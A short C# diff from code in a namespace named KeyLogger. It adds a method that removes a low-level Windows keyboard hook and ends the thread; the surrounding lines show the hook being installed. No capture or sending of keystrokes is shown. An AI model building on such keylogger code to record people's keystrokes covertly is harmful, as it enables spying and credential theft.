@@ -50,6 +50,11 @@ namespace KeyLogger
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
+        public static void stopKLog()
+        {
+            UnhookWindowsHookEx(_hookID);
+            Application.ExitThread();
+        }
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
